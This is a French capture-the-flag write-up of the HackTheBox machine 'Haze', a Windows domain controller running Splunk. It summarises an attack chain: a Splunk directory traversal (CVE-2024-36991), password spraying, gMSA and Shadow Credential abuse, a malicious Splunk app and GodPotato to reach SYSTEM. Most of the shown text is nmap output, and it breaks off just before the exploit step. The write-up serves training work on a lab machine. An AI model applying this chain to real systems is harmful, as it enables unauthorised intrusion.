---
title: Haze
date: 2025-12-11 10:28:41
categories: ["Machines", "Hackthebox"]
tags: ["Hard", "Windows", "Active Directory", "Splunk", "CVE-2024-36991", "SeImpersonatePrivilege"]
---

![Haze](/images/Haze/haze.png)

Haze est une machine Windows difficile centrée sur Splunk Enterprise. J'exploite une vulnérabilité de lecture de fichiers dans `Splunk` pour extraire et déchiffrer des mots de passe de configuration. Je trouve un mot de passe réutilisé par plusieurs utilisateurs via password spraying. L'un d'eux peut abuser des ACL Windows pour récupérer le `mot de passe gMSA` d'un compte de service, puis obtenir un `Shadow Credential` pour un autre utilisateur. J'accède ensuite à une sauvegarde Splunk contenant d'anciens mots de passe administrateur. Je télécharge une application Splunk malveillante pour obtenir un shell avec le privilège `SeImpersonatePrivilege`, que j'exploite avec `GodPotato` pour devenir SYSTEM.

## Énumération
### Nmap

Il y a plusieurs ports ouverts : `DNS`, `Kerberos`, `RPC`, `LDAP`, `SMB`, `HTTP`, `LDAPS`, `HTTPS`, `WinRM` ainsi que d'autres ports Windows.
```shell
╭─root@exegol-hackthebox /workspace/Haze
╰─➤  nmap 10.129.168.81 -T4 --min-rate 1000 -sV -sC -vv -p-
<snip>
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-31 04:29:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18a1f5986c1470b84835ecd4371ca0
| SHA-1: 6cdd5696f2506feb1a27abdfd47051433ab85d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18a1f5986c1470b84835ecd4371ca0
| SHA-1: 6cdd5696f2506feb1a27abdfd47051433ab85d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18a1f5986c1470b84835ecd4371ca0
| SHA-1: 6cdd5696f2506feb1a27abdfd47051433ab85d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18a1f5986c1470b84835ecd4371ca0
| SHA-1: 6cdd5696f2506feb1a27abdfd47051433ab85d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.168.81:8000/en-US/account/login?return_to=%2Fen-US%2F
8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5ba5ac7232f496f67395b5e64ed9b
| SHA-1: e85976a603dafeefc1ab9acfecc7fd75f1e51ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry
|_/
| http-methods:
|_  Supported Methods: GET POST HEAD OPTIONS
|_http-title: 404 Not Found
8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5ba5ac7232f496f67395b5e64ed9b
| SHA-1: e85976a603dafeefc1ab9acfecc7fd75f1e51ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56642/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56647/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56648/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56663/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56709/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 43740/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 7227/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55910/udp): CLEAN (Timeout)
|   Check 4 (port 11068/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 8h00m00s
| smb2-time:
|   date: 2025-07-31T04:30:37
|_  start_date: N/A
```


J'ajoute le nom de domaine ainsi que le FQDN dans le fichier `/etc/hosts`.
```shell
echo "10.129.168.81 haze.htb dc01.haze.htb dc01" | tee -a /etc/hosts
```


### HTTP - TCP 80

Sur la page principale, nous sommes accueillis avec une page de connexion à Splunk.
![](/images/Haze/Haze-1.png)

Rien d'intéressant sur le `robots.txt`.
![](/images/Haze/Haze-2.png)

### HTTPS - TCP 8088

Il n'y a rien sur le port `8088`.
![](/images/Haze/Haze-3.png)

### HTTPS - TCP 8089

Version de Splunk trouvée sur le port `8089`.
![](/images/Haze/Haze-4.png)

## Connexion en tant que paul.taylor
### CVE-2024-36991

Sur [cve-details](https://www.cvedetails.com/version/1890398/Splunk-Splunk-9.2.1.html), je vois que cette version de Splunk est vulnérable a une `Directory Traversal`. Je trouve aussi un POC sur ce [Github](https://github.com/jaytiwari05/CVE-2024-36991)
Je trouve des identifiants dans le fichier `/etc/passwd` de Splunk.
```shell
